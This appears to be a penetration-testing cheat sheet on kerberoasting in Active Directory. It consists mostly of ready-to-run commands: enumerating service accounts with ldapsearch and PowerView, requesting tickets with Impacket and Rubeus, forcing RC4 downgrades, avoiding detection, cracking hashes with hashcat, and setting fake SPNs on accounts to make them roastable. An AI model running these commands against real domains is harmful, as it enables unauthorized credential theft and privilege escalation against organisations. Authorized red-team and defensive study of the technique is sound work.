title: kerberoasting
html:
kerberoasting

Request TGS tickets for accounts with SPNs registered, then crack them offline. Works with any valid domain credentials. Service accounts often have weak passwords and high privileges.

When to Use

- Have valid domain credentials (any user) - Want to target service accounts (often have weak passwords + high privs) - SPNs registered on user accounts (not machine accounts -- those have random passwords)

Enumeration

Find SPNs with ldapsearch

ldapsearch -H ldap://DC -D 'user@domain.local' -w 'pass' \
  -b 'DC=domain,DC=local' \
  '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))' \
  sAMAccountName servicePrincipalName memberOf

Find SPNs with PowerView

Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, memberof

Attack - Impacket

All kerberoastable users

GetUserSPNs.py 'domain.local/user:pass' -dc-ip DC_IP -request -outputfile kerberoast.txt

Targeted (single user)

GetUserSPNs.py 'domain.local/user:pass' -dc-ip DC_IP -request-user svc_target -outputfile kerberoast.txt

With Kerberos auth (pass-the-ticket)

export KRB5CCNAME=/path/to/ticket.ccache
GetUserSPNs.py 'domain.local/user' -k -no-pass -dc-ip DC_IP -request -outputfile kerberoast.txt

Attack - Rubeus

All kerberoastable users

.\Rubeus.exe kerberoast /outfile:kerberoast.txt

Targeted kerberoasting (single SPN)

.\Rubeus.exe kerberoast /user:svc_target /outfile:kerberoast.txt

RC4 downgrade (forces weaker encryption, easier to crack)

.\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.txt

AES kerberoasting (opsec-safe, avoids RC4 detection)

.\Rubeus.exe kerberoast /aes /outfile:kerberoast.txt

Cracking

Hashcat - RC4 (type 23)

hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

Hashcat - AES256 (type 17)

hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt

Hashcat - AES128 (type 18)

hashcat -m 19600 kerberoast.txt /usr/share/wordlists/rockyou.txt

Targeted Kerberoasting (Set SPN)

If you have GenericAll/GenericWrite over a user, you can set an SPN on them, then kerberoast.

Set SPN with PowerView

Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}

Set SPN with bloodyAD

bloodyAD -d domain.local -u user -p pass --host DC_IP set object targetuser servicePrincipalName -v 'fake/spn'

Clean up after

Set-DomainObject -Identity targetuser -Clear serviceprincipalname

Notes

- Machine accounts ($) have 120-char random passwords -- skip them - RC4 tickets crack orders of magnitude faster than AES - RC4 downgrade (/tgtdeleg) may trigger alerts in mature environments - If cracking fails, try larger wordlists or custom rules targeting the org
